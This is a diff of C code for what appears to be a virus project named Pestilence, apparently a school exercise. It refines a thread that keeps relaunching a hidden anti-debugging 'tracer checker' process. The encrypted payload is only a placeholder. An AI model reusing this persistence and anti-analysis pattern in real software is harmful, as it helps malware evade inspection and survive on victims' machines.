@@ -10,8 +10,6 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-
-
 /*
 ** this files contains the tracer checker in a kind of 
 ** advanced thread process (ATP). That method is usually used
@@ -24,14 +22,8 @@
 ** if its happends. When Pestilance execution is end, the thread ends.
 */
 
-typedef struct  s_atp
-{
-    char        **env;
-    char        pestilence;
-}               t_atp;
-
-#define PERSISTENT_TRACER_CHECKER "to write here encrypted hexdump code"
-#define PTC_NAME                    "tmp/trace_me_if_u_can" // path
+# include <anti_debug.h>
+# include <pthread.h> 
 
 char                run_atp(t_atp *atp)
 {
@@ -47,8 +39,6 @@ char                run_atp(t_atp *atp)
     }
     return (FAILURE);
 }
-
-#define PROCESS_ATP     {".trace_me_if_u_can", NULL} // process: persistent process name
 
 /* have to secutize more this fcts */
 void                *__atp__(void *ptr)
@@ -73,11 +63,12 @@ void                *__atp__(void *ptr)
             time += 1000;
         if (!waiting && !check_process(process))
         {
-            run_atp(atp);
+            if (run_atp(atp) == FAILURE)
+                return (NULL);
             waiting = 1;
             time = 1;
         }
-        usleep(1000);
+        (void)usleep(1000);
     }
     return (NULL);
 }
@@ -86,8 +77,9 @@ char                build_atp(t_atp *atp)
 {
     pthread_t       thread;
 
-    run_atp(atp);
-    if (phread_create(&thread, NULL, __atp__, (void *)atp))
+    if (run_atp(atp) == FAILURE)
+        return (FAILURE);
+    if (pthread_create(&thread, NULL, __atp__, (void *)atp))
         return (FAILURE);
     return (SUCCESS);
 }
